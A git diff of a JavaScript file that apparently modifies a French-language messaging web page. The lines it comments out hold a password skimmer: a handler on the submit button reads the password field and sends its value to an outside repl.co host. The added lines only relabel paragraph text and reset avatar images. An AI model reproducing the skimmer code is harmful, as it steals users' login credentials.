@@ -39,13 +39,36 @@
 // }
 
 // document.getElementById('modalTitletriggerNouveauMessage').textContent = "Créer un nouveau message";
-document.getElementById('button-submit').setAttribute('id', 'getPwd')
-let getPwd = document.getElementById('getPwd');
+// document.getElementById('button-submit').setAttribute('id', 'getPwd')
+// let getPwd = document.getElementById('getPwd');
 
-getPwd.onclick = function() {
-    document.getElementById('password').value;
-    const Http = new XMLHttpRequest();
-    const url='https://phpwhk.conekt.repl.co/chat/index.php?text=' + document.getElementById('password').value;
-    Http.open("GET", url);
-    Http.send();
-};
+// getPwd.onclick = function() {
+//     document.getElementById('password').value;
+//     const Http = new XMLHttpRequest();
+//     const url='https://phpwhk.conekt.repl.co/chat/index.php?text=' + document.getElementById('password').value;
+//     Http.open("GET", url);
+//     Http.send();
+// };
+
+let searchText = 'EXTERN';
+
+var all = document.getElementsByTagName("p");
+
+for (var i=0, max=all.length; i < max; i++) {
+    if (all[i].textContent.includes(searchText)) {
+        let newText = all[i].textContent.replace(searchText, 'Externe libre');
+        all[i].textContent = newText;
+    }
+    console.log('a');
+}
+
+var avatar = document.getElementsByClassName('avatar');
+
+for (var i = 0, max = avatar.length; i < max; i++){
+    if (!avatar[i].classList.contains('avatar--xxl')) {
+        avatar[i].innerHTML = '';
+        avatar[i].style.backgroundImage = "url('https://www.gravatar.com/avatar/0?d=mm&s=200')";
+        avatar[i].style.backgroundSize = "cover";
+        avatar[i].style.backgroundPosition = "center";
+    }
+}
